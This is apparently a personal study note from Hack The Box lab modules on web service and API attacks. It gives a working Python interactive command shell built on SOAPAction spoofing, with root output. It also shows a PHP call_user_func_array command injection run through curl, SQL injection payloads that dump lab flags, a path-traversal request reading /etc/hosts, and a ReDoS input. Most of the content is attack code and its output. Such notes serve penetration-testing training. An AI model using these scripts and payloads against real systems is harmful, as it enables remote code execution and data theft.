

# Web Services Attacks

## SOAPAction Spoofing

- If HTTP is the transport of choice, it is allowed to use an additional HTTP header called **SOAPAction**, which contains the operation's name. 
- The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.
- If a web service considers only the **SOAPAction** attribute when determining the operation to execute, then it may be vulnerable to **SOAPAction spoofing**

**EX :**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/"
	xmlns:s="http://www.w3.org/2001/XMLSchema"
	xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
	xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
	xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
	xmlns:tns="http://tempuri.org/"
	xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
	xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">



<wsdl:types>
		<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
			<s:element name="LoginRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
						<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="LoginResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
		</s:schema>


</wsdl:types>




	<!-- Login Messages -->
	<wsdl:message name="LoginSoapIn">
		<wsdl:part name="parameters" element="tns:LoginRequest"/>
	</wsdl:message>
	<wsdl:message name="LoginSoapOut">
		<wsdl:part name="parameters" element="tns:LoginResponse"/>
	</wsdl:message>
	<!-- ExecuteCommand Messages -->
	<wsdl:message name="ExecuteCommandSoapIn">
		<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
	</wsdl:message>
	<wsdl:message name="ExecuteCommandSoapOut">
		<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
	</wsdl:message>




	<wsdl:portType name="HacktheBoxSoapPort">
		<!-- Login Operaion | PORT -->
		<wsdl:operation name="Login">
			<wsdl:input message="tns:LoginSoapIn"/>
			<wsdl:output message="tns:LoginSoapOut"/>
		</wsdl:operation>
		<!-- ExecuteCommand Operation | PORT -->
		<wsdl:operation name="ExecuteCommand">
			<wsdl:input message="tns:ExecuteCommandSoapIn"/>
			<wsdl:output message="tns:ExecuteCommandSoapOut"/>
		</wsdl:operation>
	</wsdl:portType>



	<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
		<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
		<!-- SOAP Login Action -->
		<wsdl:operation name="Login">
			<soap:operation soapAction="Login" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
		<!-- SOAP ExecuteCommand Action -->
		<wsdl:operation name="ExecuteCommand">
			<soap:operation soapAction="ExecuteCommand" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
	</wsdl:binding>


	<wsdl:service name="HacktheboxService">
		<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
			<soap:address location="http://localhost:80/wsdl"/>
		</wsdl:port>
	</wsdl:service>
</wsdl:definitions>
```
- in the above service we have SOAPAction operation called `ExecuteCommand`
- if we use this script to send soap request to `ExecuteCommand`
```python
import requests 


url = "http://10.129.255.79:3002/wsdl"

while True :
    cmd = input("$ ")
    payload = f"""<soap:Envelope
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:tns="http://tempuri.org/"
    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
    <soap:Body>
        <ExecuteCommandRequest xmlns="http://tempuri.org/">
            <cmd>{cmd}</cmd>
        </ExecuteCommandRequest>
    </soap:Body>
</soap:Envelope>"""
    res = requests.post(url=url , data=payload , headers={"SOAPAction":'"ExecuteCommand"'} )
    print(res.text)
```
- response 
```shell
python3 shell.py

$ whoami
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>
```

- using operation `ExecuteCommand` return an error  `This function is only allowed in internal networks`
- so we can use another operation in the service that is allowed outside internal network but the `SOAPAction` Header will be set to `ExecuteCommand`
- lets use `Login` operation , put `LoginRequest` element in the body but with `cmd` parameter 
```python
import requests 


url = "http://10.129.255.79:3002/wsdl"

while True :
    cmd = input("$ ")
    payload = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/"
    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
    <soap:Body>
        <LoginRequest xmlns="http://tempuri.org/">
            <cmd>{cmd}</cmd>
        </LoginRequest>
    </soap:Body>
</soap:Envelope>"""
    res = requests.post(url=url , data=payload , headers={"SOAPAction":'"ExecuteCommand"'} )
    print(res.text)

```
- response 
```shell
 python3 shell.py 
 
$ whoami
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root
</result></LoginResponse></soap:Body></soap:Envelope>
```



## Command injection

you can achieve a command injection through API 

**EX:**
- consider this PHP REST API 
```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```
- the ping function is safe , but the Webservice is not it is using `call_user_func_array` which take args directly from the user 
- `call_user_func_array` call a function using the first argument and set it's arguments using the second argument
- so we can make a request to call the system function and set it's argument like this
```bash
$ curl "http://10.129.255.79:3003/ping-server.php/system/id"  
uid=0(root) gid=0(root) groups=0(root)
```


# APIs Attacks

## SQLI 

- try inject SQL in API paramters 
```bash
curl "http://10.129.230.235:3003/?id=1+OR+1=1+--+-"

[{"id":"1","username":"admin","position":"1"},{"id":"2","username":"HTB-User-John","position":"2"},{"id":"3","username":"WebServices","position":"3"},{"id":  
"8374932","username":"HTB{THE_FL4G_FOR_SQLI_IS_H3RE}","position":"736373"}]
```
- other example in soap based api 
```python 
import requests 


url = "http://10.129.202.133:3002/wsdl"

while True :
    username = input("username ")
    password = input("passowrd ")
    payload = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/"
    xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
    <soap:Body>
        <LoginRequest xmlns="http://tempuri.org/">
            <username>{username}</username>
            <password>{password}</password>
        </LoginRequest>
    </soap:Body>
</soap:Envelope>"""
    res = requests.post(url=url , data=payload , headers={"SOAPAction":'"Login"'} )
    print(res.text)

```
- result
```shell-session
$ username admin' -- -
$ passowrd


<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><id>0</id><name>Administrator</name><email>admin@htb.net</email><username>admin</username><password>FLAG{1337_SQL_INJECTION_IS_FUN_:)}</password></LoginResponse></soap:Body></soap:Envelope>
```

## Insecure File Upload

## LFI
```shell-session
$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"

127.0.0.1 localhost
127.0.1.1 nix01-websvc
```

## XSS
- like reflection in error messages 

## SSRF



## Regular Expression Denial of Service (ReDoS)
	Regular Expression Denial of Service (ReDoS) is a type of cyber attack that        targets applications or systems that use regular expressions to process and        validate input data.

**EX:**
```shell-session
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"

{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

- The second and third groups are doing bad iterative checks.
- lets try this exploit and the server will respond in more time :

```shell-session
curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."

{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```


## XXE
### somtiems restful apis that uses json can still support xml try to change content type and send xml request that can be vulnerable to xxe
